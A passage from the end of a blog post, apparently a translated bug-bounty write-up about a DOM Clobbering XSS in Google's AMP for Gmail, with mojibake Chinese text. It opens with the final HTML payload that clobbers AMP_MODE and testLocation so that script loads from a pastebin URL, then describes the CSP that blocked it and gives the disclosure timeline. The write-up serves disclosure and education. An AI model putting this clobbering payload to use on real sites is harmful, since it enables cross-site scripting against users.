</span><span style="color:#e6db74">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;
</span><span style="color:#e6db74">&lt;a id=&#34;AMP_MODE&#34;&gt;&lt;/a&gt;
</span><span style="color:#e6db74">&lt;a id=&#34;AMP_MODE&#34; name=&#34;localDev&#34;&gt;&lt;/a&gt;
</span><span style="color:#e6db74">&lt;a id=&#34;AMP_MODE&#34; name=&#34;test&#34;&gt;&lt;/a&gt;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;
</span><span style="color:#e6db74">&lt;a id=&#34;testLocation&#34;&gt;&lt;/a&gt;
</span><span style="color:#e6db74">&lt;a id=&#34;testLocation&#34; name=&#34;protocol&#34; 
</span><span style="color:#e6db74">   href=&#34;https://pastebin.com/raw/0tn8z0rG#&#34;&gt;&lt;/a&gt;
</span><span style="color:#e6db74"></span></code></pre></div>
<p>å®é™…ä¸Šï¼Œç”±äºåœ¨ AMP ä¸­éƒ¨ç½²äº† Content-Security-Policyï¼Œå› æ­¤ä»£ç åœ¨å®é™…æƒ…å†µä¸‹æ— æ³•æ‰§è¡Œï¼š</p>

<pre><code>Content-Security-Policy: default-src 'none'; 
script-src 'sha512-oQwIl...==' 
  https://cdn.ampproject.org/rtv/ 
  https://cdn.ampproject.org/v0.js 
  https://cdn.ampproject.org/v0/
</code></pre>

<p>æˆ‘æ²¡æœ‰æ‰¾åˆ°ç»•è¿‡ CSP çš„æ–¹æ³•ï¼Œä½†æ˜¯åœ¨å°è¯•ç»•è¿‡ CSP æ—¶ï¼Œæˆ‘å‘ç°äº†ä¸€ç§ç»•è¿‡åŸºäºç›®å½•çš„ CSPçš„ æœ‰è¶£æ–¹æ³•ï¼Œå¹¶ä¸”<a href="https://twitter.com/SecurityMB/status/1162690916722839552">æˆ‘åœ¨æ¨ç‰¹ä¸Šå‘è¡¨äº†</a> ï¼ˆåæ¥å‘ç°åœ¨ <a href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">2016å¹´CTFä¸­å·²ç»ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§</a>ï¼‰ã€‚Googleåœ¨å…¶æ¼æ´èµé‡‘è®¡åˆ’ä¸­ï¼Œå®é™…ä¸Šå¹¶ä¸æœŸæœ›ç»•è¿‡ CSP ä½†ä¾ç„¶æ”¯ä»˜å…¨éƒ¨èµé‡‘ã€‚è¿™ä»ç„¶æ˜¯ä¸€ä¸ªæœ‰è¶£çš„æŒ‘æˆ˜ã€‚ ä¹Ÿè®¸å…¶ä»–äººä¼šæ‰¾åˆ°ç»•è¿‡çš„æ–¹æ³• ğŸ™‚</p>

<h2 id="æ€»ç»“">æ€»ç»“</h2>

<p>æœ¬æ–‡ä¸­ï¼Œæˆ‘å·²ç»å±•ç¤ºäº†åœ¨æ»¡è¶³æŸäº›æ¡ä»¶çš„æƒ…å†µä¸‹å¦‚ä½•ä½¿ç”¨ DOM Clobbering æ‰§è¡ŒXSSã€‚è¿™è‚¯å®šæ˜¯ä¸€ä¸ªæœ‰è¶£çš„æ—…ç¨‹ï¼å¦‚æœä½ æƒ³ç©è¿™äº› XSS ç»ƒä¹ ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘çš„åŸºäºè¿™ç§ XSS çš„ XSS æŒ‘æˆ˜ã€‚</p>

<h3 id="æ—¶é—´çº¿">æ—¶é—´çº¿</h3>

<ul>
<li>2019å¹´8æœˆ15æ—¥ - æŠ¥å‘Šç»™è°·æ­Œ</li>
<li>2019å¹´8æœˆ16æ—¥ - â€œnice catch!â€ï¼Œ</li>
<li>2019å¹´9æœˆ10æ—¥ - æ”¶åˆ°è°·æ­Œçš„å›åº”ï¼šâ€œè¿™ä¸ªæ¼æ´å¾ˆæœ‰ä»·å€¼ï¼Œè°¢è°¢æŠ¥å‘Šï¼â€ï¼Œ</li>
<li>2019å¹´10æœˆ12æ—¥ - è°·æ­Œç¡®è®¤æ¼æ´å·²ç»ä¿®å¤ï¼ˆå°½ç®¡ç°å®ä¸­ä¹‹å‰å°±å·²ç»ä¿®å¤äº†ï¼‰</li>
<li>2019å¹´11æœˆ18æ—¥ - å‘è¡¨ã€‚</li>
</ul>
</article>
    <footer class="post-footer">
        <p>æ¬¢è¿æœç´¢å¾®ä¿¡å· mad_coder æˆ–è€…æ‰«æäºŒç»´ç å…³æ³¨å…¬ä¼—å·ï¼š</p>
        <img src="https://s2.ax1x.com/2019/08/19/m1jSLd.jpg" alt="m1jSLd.jpg">
      
      <ul class="post-tags">
        
          <li><a href="https://madneal.com/tags/%E5%AE%89%E5%85%A8"><span class="tag">å®‰å…¨</span></a></li>
        
          <li><a href="https://madneal.com/tags/web-%E5%AE%89%E5%85%A8"><span class="tag">Web å®‰å…¨</span></a></li>
        
          <li><a href="https://madneal.com/tags/gmail"><span class="tag">GMail</span></a></li>
        
          <li><a href="https://madneal.com/tags/xss"><span class="tag">XSS</span></a></li>
        
          <li><a href="https://madneal.com/tags/dom-clobbering"><span class="tag">DOM Clobbering</span></a></li>
        
      </ul>
      
      <p class="post-copyright">
        Â© This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International Licenseï¼Œplease give source if you wish to quote or reproduce.This post was published <strong>219</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
      </p>
    </footer>
    
      <div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
      
    
  </section>
  <footer class="site-footer">
  <p>Â© 2017-2020 Neal&#39;s Blog</p>
</footer>



<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      displayMath: [['$$','$$'], ['\\[','\\]']],
      processEscapes: true,
      processEnvironments: true,
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
      TeX: { equationNumbers: { autoNumber: "AMS" },
      extensions: ["AMSmath.js", "AMSsymbols.js"] }
    }
  });
</script>
<script type="text/x-mathjax-config">
  // Fix <code> tags after MathJax finishes running. This is a
  // hack to overcome a shortcoming of Markdown. Discussion at
  // https://github.com/mojombo/jekyll/issues/199
  MathJax.Hub.Queue(() => {
    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
  });
</script>

<script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>


<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-104405154-2', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>





  </body>
</html>
